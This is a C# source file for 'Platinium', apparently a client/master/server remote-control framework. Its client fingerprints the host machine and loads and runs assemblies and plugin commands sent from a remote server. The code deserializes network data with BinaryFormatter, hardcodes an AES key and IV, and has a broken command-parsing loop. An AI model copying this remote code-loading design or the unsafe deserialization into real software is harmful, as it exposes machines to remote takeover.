using Platinium.Shared.Data.Packages;
using Platinium.Shared.Info;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Collections;
using System.Net;
using System.Runtime.Serialization;
using Platinium.Shared.Plugin;
using Platinium.Shared.Data.Structures;
using Platinium.Shared.Content;
using System.Reflection;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Net.NetworkInformation;
using System.Globalization;
using Platinium.Connection;
using Platinium.Shared.Data.Serialization;
using System.Windows.Forms;
using System.IO.Compression;
using Platinium.Shared.Data.Compression;
using Platinium.Shared.Core;
using Platinium.Shared.Security;
using System.Threading;

namespace Platinium
{
    namespace Shared
    {
        namespace Core
        {
            /// <summary>
            /// Provides some conversion methods.
            /// </summary>
            public partial class Converter
            {
                /// <summary>
                /// Converts an object to a dictionary.
                /// </summary>
                /// <param name="objectToConvert">The object to convert.</param>
                /// <returns>Dictionary with key type string and value type object.</returns>
                public static Dictionary<string, object> ObjectToDictionary(object objectToConvert)
                {
                    return objectToConvert.GetType()
                         .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                         .ToDictionary(prop => prop.Name, prop => prop.GetValue(objectToConvert, null));
                }
                /// <summary>
                /// Converts an object list to a dictionary list.
                /// </summary>
                /// <param name="objectListToConvert">The object list to convert</param>
                /// <returns>Dictionary List with key type string and value type object.</returns>
                public static List<Dictionary<string, object>> ObjectListToDictionaryList(List<object> objectListToConvert)
                {
                    List<Dictionary<string, object>> tempList = new List<Dictionary<string, object>>();
                    foreach (object objectToConvert in objectListToConvert)
                    {
                        tempList.Add(objectToConvert.GetType()
                         .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                         .ToDictionary(prop => prop.Name, prop => prop.GetValue(objectToConvert, null)));
                    }
                    return tempList;
                }
            }
            /// <summary>
            /// Provides some extensions.
            /// </summary>
            public static class Extensions
            {
                /// <summary>
                /// Returns the a string with the value "NULL" if the object is type null.
                /// </summary>
                /// <param name="value">The object to check if is null.</param>
                /// <returns>String with value "NULL" or a string of the parameter "value".</returns>
                public static string NULLIfNull(this object value)
                {
                    if (value == null)
                    {
                        return "NULL";
                    }
                    return value.ToString();
                }
            }
            /// <summary>
            /// Generates a unique fingerprint for the device.
            /// </summary>
            public class FingerPrint
            {
                private static string fingerPrint = string.Empty;
                public static string Value()
                {
                    if (string.IsNullOrEmpty(fingerPrint))
                    {
                        fingerPrint = GetHash("CPU >> " + cpuId() + "\nBIOS >> " + biosId() + "\nBASE >> " + baseId() + "\nMAC >> " + macId());
                    }
                    return fingerPrint;
                }
                private static string GetHash(string s)
                {
                    MD5 sec = new MD5CryptoServiceProvider();
                    ASCIIEncoding enc = new ASCIIEncoding();
                    byte[] bt = enc.GetBytes(s);
                    return GetHexString(sec.ComputeHash(bt));
                }
                private static string GetHexString(byte[] bt)
                {
                    string s = string.Empty;
                    for (int i = 0; i < bt.Length; i++)
                    {
                        byte b = bt[i];
                        int n, n1, n2;
                        n = (int)b;
                        n1 = n & 15;
                        n2 = (n >> 4) & 15;
                        if (n2 > 9)
                            s += ((char)(n2 - 10 + (int)'A')).ToString();
                        else
                            s += n2.ToString();
                        if (n1 > 9)
                            s += ((char)(n1 - 10 + (int)'A')).ToString();
                        else
                            s += n1.ToString();
                        if ((i + 1) != bt.Length && (i + 1) % 2 == 0) s += "-";
                    }
                    return s;
                }
                #region Original Device ID Getting Code
                private static string identifier(string wmiClass, string wmiProperty, string wmiMustBeTrue)
                {
                    string result = "";
                    ManagementClass mc =
                new ManagementClass(wmiClass);
                    ManagementObjectCollection moc = mc.GetInstances();
                    foreach (ManagementObject mo in moc)
                    {
                        if (mo[wmiMustBeTrue].ToString() == "True")
                        {
                            if (result == "")
                            {
                                try
                                {
                                    result = mo[wmiProperty].ToString();
                                    break;
                                }
                                catch
                                {
                                }
                            }
                        }
                    }
                    return result;
                }
                private static string identifier(string wmiClass, string wmiProperty)
                {
                    string result = "";
                    ManagementClass mc =
                new ManagementClass(wmiClass);
                    ManagementObjectCollection moc = mc.GetInstances();
                    foreach (ManagementObject mo in moc)
                    {
                        //Only get the first one
                        if (result == "")
                        {
                            try
                            {
                                result = mo[wmiProperty].ToString();
                                break;
                            }
                            catch
                            {
                            }
                        }
                    }
                    return result;
                }
                private static string cpuId()
                {
                    string retVal = identifier("Win32_Processor", "UniqueId");
                    if (retVal == "")
                    {
                        retVal = identifier("Win32_Processor", "ProcessorId");
                        if (retVal == "")
                        {
                            retVal = identifier("Win32_Processor", "Name");
                            if (retVal == "")
                            {
                                retVal = identifier("Win32_Processor", "Manufacturer");
                            }
                            retVal += identifier("Win32_Processor", "MaxClockSpeed");
                        }
                    }
                    return retVal;
                }
                private static string biosId()
                {
                    return identifier("Win32_BIOS", "Manufacturer")
                    + identifier("Win32_BIOS", "SMBIOSBIOSVersion")
                    + identifier("Win32_BIOS", "IdentificationCode")
                    + identifier("Win32_BIOS", "SerialNumber")
                    + identifier("Win32_BIOS", "ReleaseDate")
                    + identifier("Win32_BIOS", "Version");
                }
                private static string diskId()
                {
                    return identifier("Win32_DiskDrive", "Model")
                    + identifier("Win32_DiskDrive", "Manufacturer")
                    + identifier("Win32_DiskDrive", "Signature")
                    + identifier("Win32_DiskDrive", "TotalHeads");
                }
                private static string baseId()
                {
                    return identifier("Win32_BaseBoard", "Model")
                    + identifier("Win32_BaseBoard", "Manufacturer")
                    + identifier("Win32_BaseBoard", "Name")
                    + identifier("Win32_BaseBoard", "SerialNumber");
                }
                private static string videoId()
                {
                    return identifier("Win32_VideoController", "DriverVersion")
                    + identifier("Win32_VideoController", "Name");
                }
                private static string macId()
                {
                    return identifier("Win32_NetworkAdapterConfiguration",
                        "MACAddress", "IPEnabled");
                }
                #endregion
            }
            /// <summary>
            /// Contains methods to get the current device information.
            /// </summary>
            public class DeviceInfo
            {
                /// <summary>
                /// Checks if the currently logged user has administrative permissions.
                /// </summary>
                /// <returns></returns>
                public static bool IsAdministrator()
                {
                    bool ret;
                    try
                    {
                        WindowsIdentity identity = WindowsIdentity.GetCurrent();
                        WindowsPrincipal principal = new WindowsPrincipal(identity);
                        ret = principal.IsInRole(WindowsBuiltInRole.Administrator);
                    }
                    catch (Exception) { ret = false; }
                    return ret;
                }
                /// <summary>
                /// Gets the device public IP.
                /// </summary>
                /// <returns></returns>
                public static string GetPublicIP()
                {
                    string ret;
                    WebClient wc = new WebClient();
                    try
                    {
                        ret = wc.DownloadString(@"http://icanhazip.com").Trim();
                    }
                    catch (Exception) { ret = "0.0.0.0"; }
                    return ret;
                }
                /// <summary>
                /// Gets the device MAC Address.
                /// </summary>
                /// <returns></returns>
                public static string GetMacAddress()
                {
                    string ret;
                    try
                    {
                        NetworkInterface[] nic = NetworkInterface.GetAllNetworkInterfaces();
                        ret = nic.Where(x => x.OperationalStatus == OperationalStatus.Up).Select(y => y.GetPhysicalAddress().ToString()).Where(z => z != "").FirstOrDefault();
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                /// <summary>
                /// Gets the currently logged user.
                /// </summary>
                /// <returns>The name of the user.</returns>
                public static string GetCurrentLoggedUser()
                {
                    string ret;
                    try
                    {
                        ret = WindowsIdentity.GetCurrent().Name;
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                /// <summary>
                /// Gets the device name.
                /// </summary>
                /// <returns></returns>
                public static string GetComputerName()
                {
                    string ret;
                    try
                    {
                        ret = Dns.GetHostName();
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                /// <summary>
                /// Gets the current device culture.
                /// </summary>
                /// <returns>The two letter ISO code.</returns>
                public static string GetCurrentCulture()
                {
                    string ret;
                    try
                    {
                        ret = CultureInfo.CurrentCulture.TwoLetterISOLanguageName;
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                /// <summary>
                /// Gets the .NET version installed (System.Core).
                /// </summary>
                /// <returns></returns>
                public static string GetAppNetVersion()
                {
                    string ret;
                    try
                    {
                        ret = Assembly.GetExecutingAssembly().GetReferencedAssemblies().Where(x => x.Name == "System.Core").First().Version.ToString();
                    }
                    catch (Exception) { ret = "0"; }
                    return ret;
                }
                /// <summary>
                /// Gets the OS name.
                /// </summary>
                /// <returns></returns>
                public static string GetOSName()
                {
                    string ret;
                    try
                    {
                        ret = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                               select x.GetPropertyValue("Caption")).FirstOrDefault().ToString();
                    }
                    catch (Exception) { ret = "0"; }
                    return ret != null ? ret.ToString() : "Unknown";
                }
            }
            /// <summary>
            /// Logs all incoming and outcoming data.
            /// </summary>
            public class Logger
            {
                /// <summary>
                /// Path of the file.
                /// </summary>
                public string Path { get; set; }
                private ReaderWriterLockSlim lock_ = new ReaderWriterLockSlim();
                public Logger()
                {

                }
                /// <summary>
                /// Logs a message to the file.
                /// </summary>
                /// <param name="message">The message to log.</param>
                public string LogMessageToFile(string message)
                {
                    lock_.EnterWriteLock();
                    string logLine = message;
                    try
                    {
                        using (StreamWriter sw = new StreamWriter(Path, true))
                        {

                            logLine = String.Format("[{0:G}]: {1}", DateTime.Now, message);
                            sw.WriteLine(logLine);
                        }
                    }
                    catch (Exception) { lock_.ExitWriteLock(); }
                    finally { lock_.ExitWriteLock(); }
                    return logLine;
                }
            }
            /// <summary>
            /// Under construction...
            /// </summary>
            public enum LogLevel
            {
                Network,
            }
        }
        namespace Content
        {
            /// <summary>
            /// The type of package.
            /// </summary>
            public enum PackageType
            {
                Base,
                Data,
                PluginCommand,
                Status,
                NoResponse,
                Response
            }
            /// <summary>
            /// Under construction...
            /// </summary>
            [Serializable]
            public class Command
            {
                public string UID { get; private set; }
                public string Type { get; private set; }
                public string Action { get; private set; }
                public string SubAction { get; private set; }
                public string[] Parameters { get; private set; }
                /// <summary>
                /// Under construction...
                /// </summary>
                public Command(string uid, string type, string action, string subaction, string[] parameters)
                {
                    UID = uid;
                    Type = type;
                    Action = action;
                    SubAction = subaction;
                    Parameters = parameters;
                }

                public static Command ParseCommand(string command, Logger logger)
                {
                    try
                    {
                        var commandParts = command.Split(' ');
                        var uid = commandParts[0];
                        var commandT = commandParts[1].ToLower();
                        var commandC = commandParts[2].ToLower();
                        var commandA = "";
                        var startIndex = 4;
                        if (commandT == "plugin")
                        {
                            commandC = commandParts[2];
                            commandA = commandParts[3];
                            startIndex = 5;
                        }
                        else
                        {
                            commandA = commandC;
                            commandC = commandT;
                            commandT = "";
                        }
                        string[] parameters = new string[commandParts.Length - startIndex + 1];
                        if(parameters.Length > 0)
                        {
                            for (int i = 0; i <= commandParts.Length; i++)
                            {
                                parameters[i] = commandParts[startIndex];
                                startIndex++;
                            }
                        }
                        return new Command(uid, commandT, commandC, commandA, parameters);
                    }
                    catch (Exception ex)
                    {
                        logger.LogMessageToFile(ex.Message);
                        return null;
                    }
                }
            }
        }
        namespace Plugin
        {
            /// <summary>
            /// The IPlugin Interface.
            /// </summary>
            public interface IPluginImplementation
            {
                /// <summary>
                /// Contains the Client side controls.
                /// </summary>
                PluginClientController ClientController { get; set; }
                /// <summary>
                /// Contains the Master side controls.
                /// </summary>
                PluginMasterController MasterController { get; set; }
                /// <summary>
                /// Contains the GUI.
                /// </summary>
                UserControl PluginInterface { get; set; }
                /// <summary>
                /// Instantiates the Client side controller.
                /// </summary>
                void InstantiateClient();
                /// <summary>
                /// Instantiates the Master side controller.
                /// </summary>
                void InstantiateMaster();
            }
            public class PluginClientController
            {
                public PluginClientController()
                {

                }
            }
            public class PluginMasterController
            {
                public IPluginImplementation PluginInstance { get; set; }
                public PluginMasterController(IPluginImplementation plugin)
                {
                    PluginInstance = plugin;
                }
            }
            /// <summary>
            /// The Plugin metadata.
            /// </summary>
            public class Metadata : Attribute
            {
                /// <summary>
                /// Name of the Plugin.
                /// </summary>
                public string Name { get; set; }
                /// <summary>
                /// Version of the Plugin.
                /// </summary>
                public string Version { get; set; }
                /// <summary>
                /// Description of the Plugin.
                /// </summary>
                public string Description { get; set; }
            }
            /// <summary>
            /// Creates the Packages on the Plugin.
            /// </summary>
            public partial class PluginFactory
            {
                /// <summary>
                /// Generates the Package on the Plugin.
                /// </summary>
                /// <param name="inPackage">Package received.</param>
                /// <param name="baseInfoType">The type of instance.</param>
                /// <returns>The generated package.</returns>
                public static Package HandlePluginMethods(Package inPackage, BaseInfoType baseInfoType)
                {
                    Package returnPackage = inPackage;
                    string plugin_name = inPackage.Command.Action;
                    string plugin_command = inPackage.Command.SubAction;
                    List<object> commandParameters = new List<object>();
                    commandParameters.Add(inPackage);
                    commandParameters.AddRange(inPackage.Command.Parameters);
                    Type type = null;
                    if (baseInfoType == BaseInfoType.Client)
                    {
                        type = DataStructure.PluginDictionary.Where(l => l.Key.Name.ToLower().Equals(plugin_name)).Select(l => l.Value).FirstOrDefault().ClientController.GetType();
                    }
                    else if (baseInfoType == BaseInfoType.Master)
                    {
                        type = DataStructure.PluginDictionary.Where(l => l.Key.Name.ToLower().Equals(plugin_name)).Select(l => l.Value).FirstOrDefault().MasterController.GetType();
                    }

                    if (type != null)
                    {
                        MethodInfo methodInfo = type.GetMethod(plugin_command, BindingFlags.Public | BindingFlags.Static | BindingFlags.Instance | BindingFlags.IgnoreCase);
                        if (methodInfo != null)
                        {
                            ParameterInfo[] parameters = methodInfo.GetParameters();
                            IPluginImplementation pluginInstance = DataStructure.PluginDictionary.Where(l => l.Key.Name.ToLower().Equals(plugin_name)).Select(l => l.Value).FirstOrDefault();

                            if (parameters.Length == 0)
                            {
                                if (baseInfoType == BaseInfoType.Client)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.ClientController, null);
                                }
                                else if (baseInfoType == BaseInfoType.Master)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.MasterController, null);
                                }
                            }
                            else
                            {
                                if (baseInfoType == BaseInfoType.Client)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.ClientController, commandParameters.ToArray());
                                }
                                else if (baseInfoType == BaseInfoType.Master)
                                {
                                    returnPackage = (Package)methodInfo.Invoke(pluginInstance.MasterController, commandParameters.ToArray());
                                }
                            }
                        }
                    }
                    return returnPackage;
                }
            }
        }
        namespace Data
        {
            namespace Compression
            {
                /// <summary>
                /// Contains methods to compress and decompress data.
                /// </summary>
                public class Compressor
                {
                    /// <summary>
                    /// Compresses data.
                    /// </summary>
                    /// <param name="raw">The data in an array of bytes to compress.</param>
                    /// <returns>The compressed array of bytes.</returns>
                    public static byte[] Compress(byte[] raw)
                    {
                        using (MemoryStream ms = new MemoryStream())
                        {
                            using (GZipStream gzip = new GZipStream(ms, CompressionMode.Compress, true))
                            {
                                gzip.Write(raw, 0, raw.Length);
                            }
                            return ms.ToArray();
                        }
                    }
                    /// <summary>
                    /// Decompresses data.
                    /// </summary>
                    /// <param name="cgzip">The data in an array of bytes to decompress.</param>
                    /// <returns>The decompressed array of bytes.</returns>
                    public static byte[] Decompress(byte[] cgzip)
                    {
                        using (GZipStream gzip = new GZipStream(new MemoryStream(cgzip), CompressionMode.Decompress))
                        {
                            const int size = 4096;
                            byte[] buffer = new byte[size];
                            using (MemoryStream ms = new MemoryStream())
                            {
                                int count = 0;
                                do
                                {
                                    count = gzip.Read(buffer, 0, size);
                                    if (count > 0)
                                    {
                                        ms.Write(buffer, 0, count);
                                    }
                                } while (count > 0);
                                return ms.ToArray();
                            }
                        }
                    }
                }
            }
            namespace Network
            {
                public class NetworkManagement
                {
                    public static Package ReadData(NetworkStream NetworkStream)
                    {
                        List<byte> data = new List<byte>();
                        if (NetworkStream.CanRead)
                        {
                            byte[] buffer = new byte[1024];
                            int totalBytesRead = 0;
                            do
                            {
                                totalBytesRead = NetworkStream.Read(buffer, 0, buffer.Length);
                                data.AddRange(buffer);
                            } while (NetworkStream.DataAvailable);
                        }
                        //return (Package)Serializer.Deserialize(Encryption.Decrypt(Compressor.Decompress(data.ToArray()), DataStructure.ServerKey, DataStructure.ServerIV));
                        return (Package)Serializer.Deserialize(data.ToArray());
                    }
                    public static Package ReadData(NetworkStream NetworkStream, Logger logger)
                    {
                        List<byte> data = new List<byte>();
                        if (NetworkStream.CanRead)
                        {
                            byte[] buffer = new byte[1024];
                            int totalBytesRead = 0;
                            do
                            {
                                totalBytesRead = NetworkStream.Read(buffer, 0, buffer.Length);
                                data.AddRange(buffer);
                            } while (NetworkStream.DataAvailable);
                            logger.LogMessageToFile($"Data received. Size {totalBytesRead} bytes.");
                        }
                        //return (Package)Serializer.Deserialize(Encryption.Decrypt(Compressor.Decompress(data.ToArray()), DataStructure.ServerKey, DataStructure.ServerIV));
                        return (Package)Serializer.Deserialize(data.ToArray());
                    }
                    public static void WriteData(NetworkStream NetworkStream, Package Package)
                    {
                        //byte[] data = Compressor.Compress(Encryption.Encrypt(Serializer.Serialize(Package), DataStructure.ServerKey, DataStructure.ServerIV));
                        byte[] data = Serializer.Serialize(Package);
                        if (NetworkStream.CanWrite)
                        {
                            NetworkStream.Write(data, 0, data.Length);
                        }
                    }
                    public static void WriteData(NetworkStream NetworkStream, Package Package, Logger logger)
                    {
                        ///byte[] data = Compressor.Compress(Encryption.Encrypt(Serializer.Serialize(Package), DataStructure.ServerKey, DataStructure.ServerIV));
                        byte[] data = Serializer.Serialize(Package);
                        if (NetworkStream.CanWrite)
                        {
                            NetworkStream.Write(data, 0, data.Length);
                        }
                        logger.LogMessageToFile($"Data sent. Size {data.Length} bytes.");
                    }
                }
            }
            namespace Packages
            {
                public enum PackageStatus
                {
                    NotProcessed,
                    Processed,
                    TimedOut,
                    Error
                }
                /// <summary>
                /// Creates the Packages for the Client, Master and Server.
                /// </summary>
                public class PackageFactory
                {
                    /// <summary>
                    /// It's the current instance running. It can be the Server, Client and Master.
                    /// </summary>
                    public object Instance { get; set; }
                    public PackageFactory(object instance)
                    {
                        Instance = instance;
                    }
                    /// <summary>
                    /// Generates the Package on the Server.
                    /// </summary>
                    /// <param name="inPackage">Package received.</param>
                    /// <returns>The generated package.</returns>
                    public static Package HandleServerPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, inPackage.To, inPackage.From, inPackage.ID);
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command.Action)
                                {
                                    case "load_plugins":
                                        returnPackage = new Package(inPackage.Command, DataStructure.AssemblyRaw, PackageType.Data, inPackage.To, inPackage.From, inPackage.ID);
                                        break;
                                    case "client_list":
                                        returnPackage = new Package(inPackage.Command, DataStructure.ClientList, PackageType.Data, inPackage.To, inPackage.From, inPackage.ID);
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                        }
                        return returnPackage;
                    }
                    /// <summary>
                    /// Generates the Package on the Client.
                    /// </summary>
                    /// <param name="inPackage">Package received.</param>
                    /// <returns>The generated package.</returns>
                    public Package HandleClientPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, DataStructure.Info, new ClientInfo(BaseInfoType.Server), inPackage.ID);
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command.Action)
                                {
                                    case "load_plugins":
                                        DataStructure.PluginDictionary.Clear();
                                        DataStructure.AssemblyRaw = (List<byte[]>)inPackage.Content;
                                        Console.WriteLine("LOADED ASSEMBLIES");
                                        foreach (var assemblyData in DataStructure.AssemblyRaw)
                                        {
                                            Assembly assembly = Assembly.Load(assemblyData);
                                            DataStructure.LoadedAssemblyList.Add(assembly);
                                        }
                                        Type pluginType = typeof(IPluginImplementation);
                                        ICollection<Type> pluginTypes = new List<Type>();
                                        foreach (Assembly assembly in DataStructure.LoadedAssemblyList)
                                        {
                                            Type type = assembly.GetType("Plugin");
                                            if (!type.IsInterface || !type.IsAbstract)
                                            {
                                                pluginTypes.Add(type);
                                            }
                                        }
                                        foreach (Type type in pluginTypes)
                                        {
                                            IPluginImplementation plugin = (IPluginImplementation)Activator.CreateInstance(type, Instance);
                                            var pluginMetadata = (Metadata[])type.GetCustomAttributes(typeof(Metadata), true);
                                            DataStructure.PluginDictionary.Add(pluginMetadata[0], plugin);
                                            plugin.InstantiateClient();
                                        }
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = PluginFactory.HandlePluginMethods(inPackage, BaseInfoType.Client);
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                        }
                        return returnPackage;
                    }
                    /// <summary>
                    /// Generates the Package on the Master.
                    /// </summary>
                    /// <param name="inPackage">Package received.</param>
                    /// <returns>The generated package.</returns>
                    public Package HandleMasterPackages(Package inPackage)
                    {
                        Package returnPackage = new Package(null, null, PackageType.Response, DataStructure.Info, new ClientInfo(BaseInfoType.Server), inPackage.ID);
                        switch (inPackage.PackageType)
                        {
                            case PackageType.Base:
                                returnPackage = inPackage;
                                break;
                            case PackageType.Data:
                                switch (inPackage.Command.Action)
                                {
                                    case "load_plugins":
                                        DataStructure.LoadedAssemblyList.Clear();
                                        DataStructure.PluginDictionary.Clear();
                                        DataStructure.PluginMethodDictionary.Clear();
                                        DataStructure.AssemblyRaw = (List<byte[]>)inPackage.Content;
                                        Console.WriteLine("LOADED ASSEMBLIES");
                                        foreach (var assemblyData in DataStructure.AssemblyRaw)
                                        {
                                            Assembly assembly = Assembly.Load(assemblyData);
                                            DataStructure.LoadedAssemblyList.Add(assembly);
                                        }
                                        Type pluginType = typeof(IPluginImplementation);
                                        ICollection<Type> pluginTypes = new List<Type>();
                                        foreach (Assembly assembly in DataStructure.LoadedAssemblyList)
                                        {
                                            Type type = assembly.GetType("Plugin");
                                            if (!type.IsInterface || !type.IsAbstract)
                                            {
                                                pluginTypes.Add(type);
                                            }
                                        }
                                        foreach (Type type in pluginTypes)
                                        {
                                            IPluginImplementation plugin = (IPluginImplementation)Activator.CreateInstance(type, Instance);
                                            var pluginMetadata = (Metadata[])type.GetCustomAttributes(typeof(Metadata), true);
                                            MethodInfo[] methodInfo = type.GetMethods(BindingFlags.Public | BindingFlags.Instance);
                                            DataStructure.PluginDictionary.Add(pluginMetadata[0], plugin);
                                            DataStructure.PluginMethodDictionary.Add(pluginMetadata[0], methodInfo);

                                            plugin.InstantiateMaster();
                                        }
                                        break;
                                    case "client_list":
                                        DataStructure.ClientList = (List<ClientInfo>)inPackage.Content;
                                        break;
                                    default:
                                        break;
                                }
                                break;
                            case PackageType.PluginCommand:
                                returnPackage = PluginFactory.HandlePluginMethods(inPackage, BaseInfoType.Master);
                                break;
                            case PackageType.Status:
                                break;
                            case PackageType.NoResponse:
                                break;
                            case PackageType.Response:
                                break;
                        }
                        return returnPackage;
                    }
                }
                /// <summary>
                /// The Package is the class that gets serialized and is used to communicate between the client, master and server.
                /// </summary>
                [Serializable]
                public class Package
                {
                    /// <summary>
                    /// The Package ID.
                    /// </summary>
                    public string ID { get; private set; }
                    /// <summary>
                    /// To whom to send the Package.
                    /// </summary>
                    public ClientInfo To { get; private set; }
                    /// <summary>
                    /// From whom the Package is sent.
                    /// </summary>
                    public ClientInfo From { get; private set; }
                    /// <summary>
                    /// The command.
                    /// </summary>
                    public Command Command { get; private set; }
                    /// <summary>
                    /// The content of the package.
                    /// </summary>
                    public object Content { get; private set; }
                    /// <summary>
                    /// The type of package.
                    /// </summary>
                    public PackageType PackageType { get; private set; }
                    /// <summary>
                    /// Callback flag.
                    /// </summary>
                    public bool Callback { get; private set; }
                    /// <summary>
                    /// Creates a Package with a command, content, package type, from client info, to client info, and the Package ID.
                    /// If the Id is null, or not defined, it generates a new one for this Package.
                    /// </summary>
                    /// <param name="command">The command.</param>
                    /// <param name="obj">The content of the package.</param>
                    /// <param name="packagetype">The type of package.</param>
                    /// <param name="from">From whom the Package is sent.</param>
                    /// <param name="to">To whom the Package is sent.</param>
                    /// <param name="Id">The Package ID. If null, it's generated a new one.</param>
                    public Package(Command command, object obj, PackageType packagetype, ClientInfo from, ClientInfo to, string Id = null)
                    {
                        if (Id == null)
                        {
                            ID = Guid.NewGuid().ToString("N");
                        }
                        else
                        {
                            ID = Id;
                        }
                        Command = command;
                        To = to;
                        PackageType = packagetype;
                        From = from;
                        Content = obj;
                    }
                    /// <summary>
                    /// Creates a Package with a command, content, package type, and the Package ID.
                    /// If the Id is null, or not defined, it generates a new one for this Package.
                    /// The From property is picked from the DataStructure.Info object, that contains the current instance info.
                    /// </summary>
                    /// <param name="command">The command.</param>
                    /// <param name="obj">The content of the package.</param>
                    /// <param name="packagetype">The type of package.</param>
                    /// <param name="Id">The Package ID. If null, it's generated a new one.</param>
                    public Package(Command command, object obj, PackageType packagetype, string Id = null)
                    {
                        if (Id == null)
                        {
                            ID = Guid.NewGuid().ToString("N");
                        }
                        else
                        {
                            ID = Id;
                        }
                        Command = command;
                        From = DataStructure.Info;
                        Content = obj;
                        PackageType = packagetype;
                    }
                    /// <summary>
                    /// Creates a package with a command, content, package type, to client info, and the Package ID.
                    /// If the Id is null, or not defined, it generates a new one for this Package.
                    /// The From property is picked from the DataStructure.Info object, that contains the current instance info.
                    /// </summary>
                    /// <param name="command">The command.</param>
                    /// <param name="obj">The content of the package.</param>
                    /// <param name="packagetype">The type of package.</param>
                    /// <param name="to">To whom the Package is sent.</param>
                    /// <param name="Id">The Package ID. If null, it's generated a new one.</param>
                    public Package(Command command, object obj, PackageType packagetype, ClientInfo to, string Id = null)
                    {
                        if (Id == null)
                        {
                            ID = Guid.NewGuid().ToString("N");
                        }
                        else
                        {
                            ID = Id;
                        }
                        Command = command;
                        To = to;
                        PackageType = packagetype;
                        From = DataStructure.Info;
                        Content = obj;
                    }
                }
            }
            namespace Serialization
            {
                sealed class AllowAllAssemblyVersionsDeserializationBinder : SerializationBinder
                {
                    public override Type BindToType(string assemblyName, string typeName)
                    {
                        Type typeToDeserialize = null;
                        string currentAssembly = Assembly.GetExecutingAssembly().FullName;
                        assemblyName = currentAssembly;
                        typeToDeserialize = Type.GetType(String.Format("{0}, {1}", typeName, assemblyName));
                        return typeToDeserialize;
                    }
                }
                /// <summary>
                /// Contains the methods to serialize and deserialize data.
                /// </summary>
                public class Serializer
                {
                    /// <summary>
                    /// Serializes a given object.
                    /// </summary>
                    /// <param name="objToSerialize">The object to serialize.</param>
                    /// <returns>The object's byte array.</returns>
                    public static byte[] Serialize(object objToSerialize)
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            (bf).Serialize(memoryStream, objToSerialize);
                            return memoryStream.ToArray();
                        }
                    }
                    /// <summary>
                    /// Deserializes a given byte array.
                    /// </summary>
                    /// <param name="data">The byte array to deserialize.</param>
                    /// <returns>The result object of the deserialization.</returns>
                    public static object Deserialize(byte[] data)
                    {
                        using (var memoryStream = new MemoryStream(data))
                        {
                            BinaryFormatter bf = new BinaryFormatter();
                            bf.Binder = new AllowAllAssemblyVersionsDeserializationBinder();
                            memoryStream.Seek(0, SeekOrigin.Begin);
                            return (bf).Deserialize(memoryStream);
                        }
                    }
                }
            }
            namespace Structures
            {
                /// <summary>
                /// Contains global structures, dictionaries and lists.
                /// </summary>
                [Serializable]
                public static class DataStructure
                {
                    /// <summary>
                    /// Sets whether a package with the given ID has already been received or not.
                    /// </summary>
                    public static Dictionary<string, PackageStatus> PackageStatus = new Dictionary<string, PackageStatus>();
                    /// <summary>
                    /// The list of connected Masters.
                    /// </summary>
                    public static List<ClientInfo> MasterList = new List<ClientInfo>();
                    /// <summary>
                    /// The list of connected Clients.
                    /// </summary>
                    public static List<ClientInfo> ClientList = new List<ClientInfo>();
                    /// <summary>
                    /// The dictionary that contains the plugin Metadata and it's instance.
                    /// </summary>
                    public static Dictionary<Metadata, IPluginImplementation> PluginDictionary = new Dictionary<Metadata, IPluginImplementation>();
                    /// <summary>
                    /// The dictionary that contains the plugin Metadata and it's methods.
                    /// </summary>
                    public static Dictionary<Metadata, MethodInfo[]> PluginMethodDictionary = new Dictionary<Metadata, MethodInfo[]>();
                    /// <summary>
                    /// A list of raw assemblies. These are not yet loaded.
                    /// </summary>
                    public static List<byte[]> AssemblyRaw = new List<byte[]>();
                    /// <summary>
                    /// The list of all loaded assemblies.
                    /// </summary>
                    public static List<Assembly> LoadedAssemblyList = new List<Assembly>();
                    /// <summary>
                    /// The current instance information. Global between Servers, Clients and Masters.
                    /// </summary>
                    public static ClientInfo Info { get; set; }
                    /// <summary>
                    /// Under construction...
                    /// </summary>
                    public static byte[] ServerKey { get; set; } = { 0x03, 0xd3, 0x65, 0x64, 0xa7, 0x75, 0x02, 0x76, 0xe0, 0x37, 0xb9, 0xf4, 0x46, 0x3a, 0x3d, 0xd9,
                                                                     0x07, 0x17, 0x79, 0x88, 0x97, 0x6d, 0xc8, 0x4a, 0xe4, 0x97, 0xac, 0x88, 0xb9, 0x2b, 0x62, 0xdb };
                    /// <summary>
                    /// Under construction...
                    /// </summary>
                    public static byte[] ServerIV { get; set; } = { 0x01, 0x5f, 0x16, 0x1a, 0x3b, 0x0c, 0x0f, 0x75, 0x80, 0xb1, 0x0d, 0x0f, 0xdb, 0x2d, 0xdf, 0x56 };
                }
            }
        }
        namespace Info
        {
            /// <summary>
            /// The type of instance.
            /// </summary>
            public enum BaseInfoType
            {
                Client,
                Master,
                Server
            }
            /// <summary>
